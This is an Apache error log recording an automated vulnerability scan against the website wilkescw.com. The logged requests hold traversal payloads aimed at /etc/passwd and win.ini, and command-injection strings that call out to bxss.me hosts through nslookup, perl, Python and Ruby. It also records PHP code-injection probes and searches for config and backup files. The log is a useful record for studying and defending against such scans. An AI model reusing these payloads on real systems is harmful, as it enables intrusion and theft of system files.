[Thu Jul 08 00:26:21.359822 2021] [core:error] [pid 29417] [client 27.147.202.214:2004] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:21.575488 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/backup_config.php' not found or unable to stat
[Thu Jul 08 00:26:21.695932 2021] [php7:error] [pid 29557] [client 27.147.202.214:2001] script '/var/www/html/wilkescw.com/F0vV8c510.php' not found or unable to stat
[Thu Jul 08 00:26:22.125077 2021] [core:error] [pid 29685] (36)File name too long: [client 27.147.202.214:11464] AH00036: access to /;(nslookup hitsykjghymwi4b5b8.bxss.me||perl -e "gethostbyname('hitsykjghymwi4b5b8.bxss.me')")|(nslookup hitsykjghymwi4b5b8.bxss.me||perl -e "gethostbyname('hitsykjghymwi4b5b8.bxss.me')")&(nslookup hitsykjghymwi4b5b8.bxss.me||perl -e "gethostbyname('hitsykjghymwi4b5b8.bxss.me')")/style.css failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitsykjghymwi4b5b8.bxss.me||perl -e "gethostbyname('hitsykjghymwi4b5b8.bxss.me')")|(nslookup hitsykjghymwi4b5b8.bxss.me||perl -e "gethostbyname('hitsykjghymwi4b5b8.bxss.me')")&(nslookup hitsykjghymwi4b5b8.bxss.me||perl -e "gethostbyname('hitsykjghymwi4b5b8.bxss.me')")')
[Thu Jul 08 00:26:22.684271 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/config_backup.php' not found or unable to stat
[Thu Jul 08 00:26:22.864409 2021] [php7:error] [pid 29557] [client 27.147.202.214:2001] script '/var/www/html/wilkescw.com/c516coqPV.php' not found or unable to stat
[Thu Jul 08 00:26:23.115511 2021] [core:error] [pid 29771] [client 27.147.202.214:2012] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:23.121316 2021] [negotiation:error] [pid 29656] [client 27.147.202.214:1999] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c510 (None could be negotiated).
[Thu Jul 08 00:26:23.435212 2021] [core:error] [pid 29654] [client 27.147.202.214:1985] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:23.498424 2021] [php7:error] [pid 29557] [client 27.147.202.214:2001] script '/var/www/html/wilkescw.com/0OPVec516.php' not found or unable to stat
[Thu Jul 08 00:26:24.130578 2021] [core:error] [pid 29702] [client 27.147.202.214:2008] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:24.344988 2021] [core:error] [pid 29780] [client 27.147.202.214:2010] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:24.453503 2021] [core:error] [pid 29684] [client 27.147.202.214:1979] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:24.531913 2021] [negotiation:error] [pid 29507] [client 27.147.202.214:1986] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c516 (None could be negotiated).
[Thu Jul 08 00:26:24.665861 2021] [core:error] [pid 29708] [client 27.147.202.214:2003] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:24.668966 2021] [php7:error] [pid 29527] [client 27.147.202.214:1978] script '/var/www/html/wilkescw.com/response.write(9803069*9925041).php' not found or unable to stat
[Thu Jul 08 00:26:24.880187 2021] [php7:error] [pid 29695] [client 27.147.202.214:1998] script '/var/www/html/wilkescw.com/echo onutrf$()\\ vfnsmk\\nz^xyu||a #' &echo onutrf$()\\ vfnsmk\\nz^xyu||a #|" &echo onutrf$()\\ vfnsmk\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:26:24.987255 2021] [php7:error] [pid 29527] [client 27.147.202.214:1978] script '/var/www/html/wilkescw.com/2krrIvmh.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:24.991972 2021] [php7:error] [pid 29646] [client 27.147.202.214:11454] script '/var/www/html/wilkescw.com/'+response.write(9803069*9925041)+'.php' not found or unable to stat
[Thu Jul 08 00:26:25.096474 2021] [php7:error] [pid 29719] [client 27.147.202.214:2013] script '/var/www/html/wilkescw.com/old_c501.php' not found or unable to stat
[Thu Jul 08 00:26:25.200571 2021] [php7:error] [pid 29695] [client 27.147.202.214:1998] script '/var/www/html/wilkescw.com/&echo fjdlny$()\\ trgaav\\nz^xyu||a #' &echo fjdlny$()\\ trgaav\\nz^xyu||a #|" &echo fjdlny$()\\ trgaav\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:26:25.314314 2021] [php7:error] [pid 29646] [client 27.147.202.214:11454] script '/var/www/html/wilkescw.com/"+response.write(9803069*9925041)+".php' not found or unable to stat
[Thu Jul 08 00:26:25.402374 2021] [php7:error] [pid 29719] [client 27.147.202.214:2013] script '/var/www/html/wilkescw.com/c501_old.php' not found or unable to stat
[Thu Jul 08 00:26:25.442830 2021] [authz_core:error] [pid 29686] [client 27.147.202.214:10260] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/.php, referer: https://wilkescw.com/
[Thu Jul 08 00:26:25.479717 2021] [php7:error] [pid 29524] [client 27.147.202.214:10277] script '/var/www/html/wilkescw.com/|echo knvvgv$()\\ qqldbt\\nz^xyu||a #' |echo knvvgv$()\\ qqldbt\\nz^xyu||a #|" |echo knvvgv$()\\ qqldbt\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:26:25.698682 2021] [php7:error] [pid 29719] [client 27.147.202.214:2013] script '/var/www/html/wilkescw.com/c501_bak.php' not found or unable to stat
[Thu Jul 08 00:26:25.790335 2021] [php7:error] [pid 29524] [client 27.147.202.214:10277] script '/var/www/html/wilkescw.com/(nslookup hitpqphjfkrqp85748.bxss.me||perl -e "gethostbyname('hitpqphjfkrqp85748.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:26:25.815567 2021] [php7:error] [pid 29648] [client 27.147.202.214:12579] script '/var/www/html/wilkescw.com/c501&n932892=v956803.php' not found or unable to stat
[Thu Jul 08 00:26:25.859323 2021] [php7:error] [pid 29685] [client 27.147.202.214:11464] script '/var/www/html/wilkescw.com/).php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:26.045271 2021] [php7:error] [pid 29719] [client 27.147.202.214:2013] script '/var/www/html/wilkescw.com/'.gethostbyname(lc('hithm'.'jjrujsub5ebfa.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(105).chr(85).chr(99).chr(74).'.php' not found or unable to stat
[Thu Jul 08 00:26:26.052466 2021] [php7:error] [pid 29686] [client 27.147.202.214:10260] script '/var/www/html/wilkescw.com/;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));.php' not found or unable to stat
[Thu Jul 08 00:26:26.140464 2021] [core:error] [pid 29524] [client 27.147.202.214:10277] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:26.182819 2021] [php7:error] [pid 29669] [client 27.147.202.214:1995] script '/var/www/html/wilkescw.com/!(()&&!|*|*|.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:26.365538 2021] [php7:error] [pid 29719] [client 27.147.202.214:2013] script '/var/www/html/wilkescw.com/';print(md5(31337));$a='.php' not found or unable to stat
[Thu Jul 08 00:26:26.408904 2021] [php7:error] [pid 29686] [client 27.147.202.214:10260] script '/var/www/html/wilkescw.com/$(nslookup hitinakxkntdg15305.bxss.me||perl -e "gethostbyname('hitinakxkntdg15305.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:26:26.451836 2021] [core:error] [pid 29652] [client 27.147.202.214:10956] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:26.495980 2021] [php7:error] [pid 29669] [client 27.147.202.214:1995] script '/var/www/html/wilkescw.com/^(#$!@#$)(()))******.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:26.609055 2021] [core:error] [pid 29682] [client 27.147.202.214:2009] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:26.679257 2021] [php7:error] [pid 29719] [client 27.147.202.214:2013] script '/var/www/html/wilkescw.com/";print(md5(31337));$a=".php' not found or unable to stat
[Thu Jul 08 00:26:26.809642 2021] [php7:error] [pid 29697] [client 27.147.202.214:14142] script '/var/www/html/wilkescw.com/str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitirtbjapvcwc253b.'+'bxss.me').php' not found or unable to stat
[Thu Jul 08 00:26:26.904693 2021] [core:error] [pid 29721] [client 27.147.202.214:1981] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:27.031810 2021] [php7:error] [pid 29686] [client 27.147.202.214:10260] script '/var/www/html/wilkescw.com/&(nslookup hitlrxskgxwmc3fb87.bxss.me||perl -e "gethostbyname('hitlrxskgxwmc3fb87.bxss.me')")&'\\"`0&(nslookup hitlrxskgxwmc3fb87.bxss.me||perl -e "gethostbyname('hitlrxskgxwmc3fb87.bxss.me')")&`'.php' not found or unable to stat
[Thu Jul 08 00:26:27.109325 2021] [php7:error] [pid 29697] [client 27.147.202.214:14142] script '/var/www/html/wilkescw.com/'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitirtbjapvcwc253b."+"bxss.me")+'.php' not found or unable to stat
[Thu Jul 08 00:26:27.137182 2021] [php7:error] [pid 29668] [client 27.147.202.214:2005] script '/var/www/html/wilkescw.com/old_c510.php' not found or unable to stat
[Thu Jul 08 00:26:27.260317 2021] [php7:error] [pid 29664] [client 27.147.202.214:3175] script '/var/www/html/wilkescw.com/".gethostbyname(lc("hitwr"."otjxrxkfe2d05.bxss.me."))."A".chr(67).chr(hex("58")).chr(115).chr(65).chr(99).chr(90).".php' not found or unable to stat
[Thu Jul 08 00:26:27.423517 2021] [php7:error] [pid 29697] [client 27.147.202.214:14142] script '/var/www/html/wilkescw.com/"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitirtbjapvcwc253b.'+'bxss.me')+".php' not found or unable to stat
[Thu Jul 08 00:26:27.451463 2021] [php7:error] [pid 29668] [client 27.147.202.214:2005] script '/var/www/html/wilkescw.com/c510_old.php' not found or unable to stat
[Thu Jul 08 00:26:27.529035 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))).php' not found or unable to stat
[Thu Jul 08 00:26:27.606393 2021] [php7:error] [pid 29648] [client 27.147.202.214:12579] script '/var/www/html/wilkescw.com/'".php' not found or unable to stat
[Thu Jul 08 00:26:27.655085 2021] [php7:error] [pid 29615] [client 27.147.202.214:3188] script '/var/www/html/wilkescw.com/"+"A".concat(70-3).concat(22*4).concat(117).concat(71).concat(102).concat(70)+(require"socket"\nSocket.gethostbyname("hitma"+"xucmzqti72558.bxss.me.")[3].to_s)+".php' not found or unable to stat
[Thu Jul 08 00:26:27.718000 2021] [php7:error] [pid 29686] [client 27.147.202.214:10260] script '/var/www/html/wilkescw.com/bxss.me.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:27.767379 2021] [php7:error] [pid 29668] [client 27.147.202.214:2005] script '/var/www/html/wilkescw.com/c510_bak.php' not found or unable to stat
[Thu Jul 08 00:26:27.832117 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/1epfChlNO.php' not found or unable to stat
[Thu Jul 08 00:26:27.913535 2021] [php7:error] [pid 29719] [client 27.147.202.214:2013] script '/var/www/html/wilkescw.com/<!--.php' not found or unable to stat
[Thu Jul 08 00:26:27.998359 2021] [php7:error] [pid 29615] [client 27.147.202.214:3188] script '/var/www/html/wilkescw.com/c525MSbGe.php' not found or unable to stat
[Thu Jul 08 00:26:28.268002 2021] [php7:error] [pid 29531] [client 27.147.202.214:3199] script '/var/www/html/wilkescw.com/'+'A'.concat(70-3).concat(22*4).concat(115).concat(85).concat(118).concat(90)+(require'socket'\nSocket.gethostbyname('hitcz'+'wqjymaqa9b7c0.bxss.me.')[3].to_s)+'.php' not found or unable to stat
[Thu Jul 08 00:26:28.377631 2021] [php7:error] [pid 29686] [client 27.147.202.214:10260] script '/var/www/html/wilkescw.com/c5019446152.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:28.578036 2021] [php7:error] [pid 29531] [client 27.147.202.214:3199] script '/var/www/html/wilkescw.com/NTWNfc525.php' not found or unable to stat
[Thu Jul 08 00:26:28.725657 2021] [core:error] [pid 29708] [client 27.147.202.214:3261] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:28.858835 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/c616Q8SWt.php' not found or unable to stat
[Thu Jul 08 00:26:28.938592 2021] [php7:error] [pid 29557] [client 27.147.202.214:2001] script '/var/www/html/wilkescw.com/old_c516.php' not found or unable to stat
[Thu Jul 08 00:26:28.957314 2021] [negotiation:error] [pid 29669] [client 27.147.202.214:1995] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c525 (None could be negotiated).
[Thu Jul 08 00:26:29.234921 2021] [php7:error] [pid 29557] [client 27.147.202.214:2001] script '/var/www/html/wilkescw.com/c516_old.php' not found or unable to stat
[Thu Jul 08 00:26:29.300864 2021] [php7:error] [pid 29366] [client 27.147.202.214:3227] script '/var/www/html/wilkescw.com/|(nslookup hithjqjhdqmdlb883f.bxss.me||perl -e "gethostbyname('hithjqjhdqmdlb883f.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:26:29.460827 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/KIyDnc616.php' not found or unable to stat
[Thu Jul 08 00:26:29.558457 2021] [php7:error] [pid 29557] [client 27.147.202.214:2001] script '/var/www/html/wilkescw.com/c516_bak.php' not found or unable to stat
[Thu Jul 08 00:26:29.672171 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/config.inc.php' not found or unable to stat
[Thu Jul 08 00:26:29.757620 2021] [php7:error] [pid 29732] [client 27.147.202.214:2014] script '/var/www/html/wilkescw.com/zaaEOIIh.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:29.906812 2021] [negotiation:error] [pid 29697] [client 27.147.202.214:14142] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c616 (None could be negotiated).
[Thu Jul 08 00:26:29.984580 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/localconfig.php' not found or unable to stat
[Thu Jul 08 00:26:30.602594 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/configuration.php' not found or unable to stat
[Thu Jul 08 00:26:31.025275 2021] [core:error] [pid 29647] [client 27.147.202.214:8367] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
